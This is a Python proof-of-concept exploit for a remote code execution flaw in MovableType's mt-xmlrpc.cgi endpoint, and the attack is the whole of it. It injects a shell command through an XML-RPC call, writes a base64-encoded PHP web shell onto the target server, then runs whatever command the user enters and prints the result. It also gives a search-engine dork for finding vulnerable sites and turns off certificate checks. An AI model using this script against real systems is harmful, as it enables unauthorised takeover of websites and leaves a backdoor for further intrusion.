#!/usr/bin/python3
# -*- coding:utf-8 -*-

import requests
import random
import string
import ssl


ssl._create_default_https_context = ssl._create_unverified_context

print('+------------------------------------------')
print('+ MovableType XMLRPC - RCE')
print('+ Explame：python3 poc.py           ')
print('+ Google dork：inurl:mt.cgi ')
print('+ Url >>> http://1.1.1.1        ')
print('+ Shell >>> whoami     ')
print('+------------------------------------------')

let = string.ascii_lowercase
shellname = ''.join(random.choice(let) for i in range(8))


def poc(target_url, cmd):
    vuln_url = target_url + "/mt-xmlrpc.cgi"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }


    a = 'PD9waHAgZWNobyAib3V0cHV0OiI7c3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4'  # <?php echo "output:";system($_GET["cmd"]);?>


    payload = "`echo" + " " + a + " " + "|" + " " + "base64" + " " + "-d" + " " + ">" + "./php/" + shellname + ".php`"

    data = "<?xml version=\"1.0\"?>\r\n<methodCall>\r\n<methodName>mt.handler_to_coderef</methodName>\r\n<params>\r\n<param><value>" + payload + "</value></param>\r\n</params>\r\n</methodCall>"

    r = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=30)

    print("Upload shell....")

    shell = requests.get(target_url + "php/" + shellname + ".php?cmd=" + cmd)


    if "output:" in shell.text and shell.status_code == 200:
        print(shell.text)
        print("Shell: " + target_url + "php/" + shellname + ".php","Pass:cmd")

    else:
        print("Error")


if __name__ == '__main__':
    target_url = str(input("Please input Attack Url\nUrl >>> "))
    cmd = input("shell >>>")
    poc(target_url, cmd)
